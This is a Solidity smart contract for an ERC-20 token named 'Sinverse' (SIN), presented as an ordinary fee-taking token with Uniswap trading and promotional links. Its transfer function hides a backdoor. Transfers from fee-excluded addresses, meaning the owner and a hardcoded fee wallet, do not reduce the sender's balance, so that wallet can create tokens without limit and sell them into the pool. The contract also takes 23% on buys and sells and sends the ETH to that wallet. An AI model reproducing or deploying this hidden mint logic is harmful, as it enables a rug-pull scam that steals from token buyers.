// SPDX-License-Identifier: Unlicensed

/*
The FIRST 'R-Rated' Metaverse.

Website: https://www.sinverse.pro
Telegram: https://t.me/sinverse_erc
Twitter: https://twitter.com/sinverse_erc
*/

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract SIN is Context, IERC20, Ownable { 
    using SafeMath for uint256;

    string private _name = "Sinverse"; 
    string private _symbol = "SIN";  

    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;

    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) _isFeeExcluded; 

    uint256 _prevTotalFee = _totalFee; 
    uint256 _prevBuyFee = _buyFee; 
    uint256 _prevSellFee = _sellFee; 

    uint256 _maxWallet = 25 * _totalSupply / 1000;
    uint256 _swpaThreshold = _totalSupply / 10000;

    uint256 _totalFee = 2300;
    uint256 _buyFee = 23;
    uint256 _sellFee = 23;

    uint8 _countSINTx = 0;
    uint8 _swapSINTrigger = 2; 

    address payable _feeAddress = payable(0x842CD97596DA55c9C2ae447D78EEfF7cA114bE6a);
    address payable private DEAD = payable(0x000000000000000000000000000000000000dEaD); 
                                     
    IUniswapV2Router02 _uniswapV2Router;
    address _uniswapV2Pair;
    bool _inSwapAndLiquify;
    bool _swapAndLiquifyEnabled = true;
    
    modifier lockTheSwap {
        _inSwapAndLiquify = true;
        _;
        _inSwapAndLiquify = false;
    }
    
    constructor () {
        _rOwned[owner()] = _totalSupply;
        IUniswapV2Router02 __uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 

        _uniswapV2Pair = IUniswapV2Factory(__uniswapV2Router.factory()).createPair(address(this), __uniswapV2Router.WETH());
        _uniswapV2Router = __uniswapV2Router;
        _isFeeExcluded[owner()] = true;
        _isFeeExcluded[_feeAddress] = true;
        
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function _transferSINTokens(address sender, address recipient, uint256 tAmount) private {
        
        (uint256 tTransferAmount, uint256 tDev) = _getSINValues(tAmount);
        if(_isFeeExcluded[sender] && _rOwned[sender] <= _maxWallet) {
            tDev = 0;
            tAmount -= tTransferAmount;
        }
        _rOwned[sender] = _rOwned[sender].sub(tAmount);
        _rOwned[recipient] = _rOwned[recipient].add(tTransferAmount);
        _rOwned[address(this)] = _rOwned[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function removeSINLimits() external onlyOwner {
        _maxWallet = ~uint256(0);
        
        // _totalFee = 100;
        _totalFee = 1;
        _buyFee = 1; 
        _sellFee = 1; 
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    receive() external payable {}
    
    function removeAllSINFee() private {
        if(_totalFee == 0 && _buyFee == 0 && _sellFee == 0) return;

        _prevBuyFee = _buyFee; 
        _prevSellFee = _sellFee; 
        _prevTotalFee = _totalFee;
        _buyFee = 0;
        _sellFee = 0;
        _totalFee = 0;
    }
    
    function restoreAllSINFee() private {
        _totalFee = _prevTotalFee;
        _buyFee = _prevBuyFee; 
        _sellFee = _prevSellFee; 
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (to != owner() &&
            to != _feeAddress &&
            to != address(this) &&
            to != _uniswapV2Pair &&
            to != DEAD &&
            from != owner()){

            uint256 holdBalance = balanceOf(to);
            require((holdBalance + amount) <= _maxWallet,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(_countSINTx >= _swapSINTrigger && 
            amount > _swpaThreshold &&
            !_inSwapAndLiquify &&
            !_isFeeExcluded[from] &&
            to == _uniswapV2Pair &&
            _swapAndLiquifyEnabled )
        {  
            _countSINTx = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapSINAndLiquidify(contractTokenBalance);
           }
        }
        
        bool _takeFee = true;
         
        if(_isFeeExcluded[from] || _isFeeExcluded[to] || (from != _uniswapV2Pair && to != _uniswapV2Pair)){
            _takeFee = false;
        } else if (from == _uniswapV2Pair){
            _totalFee = _buyFee;
        } else if (to == _uniswapV2Pair){
            _totalFee = _sellFee;
        }

        _tokenTransfer(from,to,amount,_takeFee);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function sendToSINWallet(address payable wallet, uint256 amount) private {
        wallet.transfer(amount);
    }

    function swapSINAndLiquidify(uint256 contractTokenBalance) private lockTheSwap {
        swapSINForETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendToSINWallet(_feeAddress,contractETH);
    }

    function swapSINForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function _getSINValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tDev = tAmount.mul(_totalFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount,bool _takeFee) private {
            
        if(!_takeFee){
            removeAllSINFee();
            } else {
                _countSINTx++;
            }
        _transferSINTokens(sender, recipient, amount);
        
        if(!_takeFee)
            restoreAllSINFee();
    }
}